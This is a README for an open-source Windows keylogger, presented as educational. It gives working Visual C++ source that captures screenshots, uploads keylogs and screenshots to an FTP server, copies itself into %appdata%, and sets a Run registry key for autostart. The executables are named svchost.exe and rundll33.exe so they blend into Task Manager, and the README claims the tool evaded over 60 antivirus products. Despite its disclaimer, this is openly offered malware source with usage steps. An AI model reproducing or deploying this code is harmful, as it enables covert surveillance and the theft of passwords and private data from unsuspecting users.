# Keylogger

![Visitor Badge](https://visitor-badge.laobi.icu/badge?page_id=ajayrandhawa.Keylogger&title=Visitor)  
**Please don't forget to give us a ⭐ if you find this project useful!**

---

## Overview

Keylogger is a lightweight, open-source tool designed for **educational purposes only** to demonstrate keylogging and system monitoring capabilities. Developed in Visual C++, it runs in stealth mode (hidden window) and captures keystrokes, mouse clicks, and periodic screenshots. The captured data is sent to a designated FTP server for analysis.

> **DISCLAIMER**: This tool is strictly for educational and ethical use. Unauthorized or malicious use is prohibited. Users are solely responsible for their actions. This project is provided as open-source software with **no warranty**.

---

## Features

- **Stealth Operation**: Runs invisibly in the background, designed to be tamper-proof and discreet.
- **Keystroke Logging**: Captures every keystroke, including deleted ones, with detailed logs for easy analysis.
- **Continuous Screenshots**: Records screenshots of selected programs or websites, enabling video-style playback (includes 1,000 screenshots).
- **FTP Integration**: Automatically uploads logs and screenshots to an FTP server (default: `ftp://192.168.8.2:2121`).
- **AutoStart**: Configures itself to launch automatically on system boot.
- **AutoCopy**: Copies itself to the `%appdata%/roaming/wpdnse/` folder for persistence.

---

## Repository Contents

The `Keylogger.zip` file includes two executable files and the full source code:

1. **svchost.exe**: Main keylogger process for capturing keystrokes and mouse activity.
2. **rundll33.exe**: Handles screenshot capture and uploads logs/screenshots to the FTP server.

> **Note**: The executable names are chosen to blend into the Task Manager for demonstration purposes. Always use responsibly.

---

## Installation and Usage

### Prerequisites
- A running FTP server at `192.168.8.2:2121` (or configure your own server).
- Windows operating system (for compatibility with Visual C++ code).
- Visual C++ development environment (optional, for modifying source code).

### Steps
1. **Set up the FTP Server**:
   - Configure an FTP server at `192.168.8.2:2121` to receive logs and screenshots.
2. **Run the Executables**:
   - Execute `svchost.exe` and `rundll33.exe` once. They will auto-configure to start on system boot.
3. **Monitor Activity**:
   - The keylogger will capture keystrokes, mouse clicks, and screenshots, sending them to the FTP server at regular intervals.

> **Note**: Ensure you have proper authorization to monitor any system. Unauthorized use may violate local laws.

---

## Source Code Highlights

The project is written in Visual C++ and includes the following key functions:

### 1. Capture Screenshots
Captures the desktop as a JPEG image using GDI+.

```cpp
void screenshot(string file) {
    ULONG_PTR gdiplustoken;
    GdiplusStartupInput gdistartupinput;
    GdiplusStartupOutput gdistartupoutput;
    gdistartupinput.SuppressBackgroundThread = true;
    GdiplusStartup(&gdiplustoken, &gdistartupinput, &gdistartupoutput);
    HDC dc = GetDC(GetDesktopWindow());
    HDC dc2 = CreateCompatibleDC(dc);
    RECT rc0kno;
    GetClientRect(GetDesktopWindow(), &rc0kno);
    int w = rc0kno.right - rc0kno.left;
    int h = rc0kno.bottom - rc0kno.top;
    HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h);
    HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);
    BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);
    Bitmap* bm = new Bitmap(hbitmap, NULL);
    UINT num, size;
    ImageCodecInfo* imagecodecinfo;
    GetImageEncodersSize(&num, &size);
    imagecodecinfo = (ImageCodecInfo*)(malloc(size));
    GetImageEncoders(num, size, imagecodecinfo);
    CLSID clsidEncoder;
    for (int i = 0; i < num; i++) {
        if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
            clsidEncoder = imagecodecinfo[i].Clsid;
    }
    free(imagecodecinfo);
    wstring ws;
    ws.assign(file.begin(), file.end());
    bm->Save(ws.c_str(), &clsidEncoder);
    SelectObject(dc2, holdbitmap);
    DeleteObject(dc2);
    DeleteObject(hbitmap);
    ReleaseDC(GetDesktopWindow(), dc);
    GdiplusShutdown(gdiplustoken);
}
```

### 2. Send Screenshots to FTP
Uploads screenshots to the specified FTP server.

```cpp
void ftp_scrshot_send() {
    HINTERNET hInternet;
    HINTERNET hFtpSession;
    DWORD rec_timeout = 5000;
    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        log_error_file << "Error:" << GetLastError();
    } else {
        hFtpSession = InternetConnect(hInternet, "192.168.8.2", 2121, NULL, NULL, INTERNET_SERVICE_FTP, 0, 0);
        InternetSetOption(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &rec_timeout, sizeof(rec_timeout));
        if (hFtpSession == NULL) {
            log_error_file << "Error:" << GetLastError();
        } else {
            if (!FtpPutFile(hFtpSession, "core32.mni", "hacks/sc/dc.jpg", FTP_TRANSFER_TYPE_BINARY, 0)) {
                log_error_file << "Error:" << GetLastError();
            }
        }
    }
    log_error_file.close();
}
```

### 3. Send Keylog Data to FTP
Uploads keylog data to the FTP server.

```cpp
void ftplogsend() {
    HINTERNET hInternet;
    HINTERNET hFtpSession;
    DWORD rec_timeout = 2000;
    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        log_error_file << "Error:" << GetLastError();
    } else {
        hFtpSession = InternetConnect(hInternet, "192.168.8.2", 2121, NULL, NULL, INTERNET_SERVICE_FTP, 0, 0);
        InternetSetOption(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &rec_timeout, sizeof(rec_timeout));
        if (hFtpSession == NULL) {
            log_error_file << "Error:" << GetLastError();
        } else {
            if (!FtpPutFile(hFtpSession, "atapi.sys", "hacks/hacks.txt", FTP_TRANSFER_TYPE_BINARY, 0)) {
                log_error_file << "Error:" << GetLastError();
                log_error_file.close();
            }
        }
    }
}
```

### 4. AutoCopy and Initialize Keylog File
Ensures persistence by copying the executable to `%appdata%` and initializing logs with a timestamp.

```cpp
void AutoCopy() {
    string f_path = userlc;
    string f_name = f_path + "\\svchost.exe";
    char my_name[260];
    GetModuleFileName(GetModuleHandle(0), my_name, 260);
    string f_my = my_name;
    CreateDirectory(f_path.c_str(), NULL);
    CopyFile(f_my.c_str(), f_name.c_str(), FALSE);
}

void Install() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    string yearS = to_string(st.wYear) + "_";
    string monthS = to_string(st.wMonth) + "-";
    string dayS = to_string(st.wDay) + "-";
    string hourS = to_string(st.wHour) + "H-";
    string mintueS = to_string(st.wMinute) + "M------------>\n\n";
    string startDate = "\n\n" + dayS + monthS + yearS + hourS + mintueS;
    char dateCh[260];
    strcpy(dateCh, startDate.c_str());
    string ff_path = userlc + "atapi.sys";
    FILE* file = fopen(ff_path.c_str(), "a+");
    fputs(dateCh, file);
    fclose(file);
}
```

### 5. AutoStart on System Boot
Configures the keylogger to run automatically on system startup.

```cpp
void AutoStart() {
    char Driver[MAX_PATH];
    HKEY hKey;
    string ff_path = userlc + "svchost.exe";
    strcpy(Driver, ff_path.c_str());
    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
    RegCloseKey(hKey);
}
```

---

## Antivirus Detection

This keylogger was designed to bypass over 60 antivirus programs (based on an outdated VirusTotal report). However, modern antivirus updates may detect it. Always test in a controlled environment.

> **Warning**: The screenshot of the VirusTotal report (`virustotal.PNG`) is outdated and for reference only.

---

## Disclaimer

This project is intended for **educational purposes only**. We do not endorse or support any malicious or illegal activities. Please read our FAQ for clarity on our policies:

### FAQ

1. **Do you develop malware for malicious intent?**  
   No, we do not engage in the development or distribution of malicious software. Our tools are for ethical and educational use only.

2. **Do you offer customization for malicious tools?**  
   No, we do not provide customization for malware or harmful software.

3. **Are you responsible for misuse of this tool?**  
   No, users are solely responsible for adhering to local laws and using this tool ethically.

4. **Are you liable for unauthorized use?**  
   No, we are not liable for any unauthorized or illegal use of this tool.

5. **What is your commitment to ethics?**  
   We are committed to ethical technology development and compliance with legal standards.

6. **How can I contact you?**  
   Reach out via GitHub issues for questions about this project or our policies.

---

## Contributing

We welcome contributions to improve this project! Please follow these steps:
1. Fork the repository.
2. Create a new branch (`git checkout -b feature/your-feature`).
3. Commit your changes (`git commit -m 'Add your feature'`).
4. Push to the branch (`git push origin feature/your-feature`).
5. Open a Pull Request.

---

## Happy Coding & Stay Ethical!

**Happy Cyber Security, Happy Open Source!**
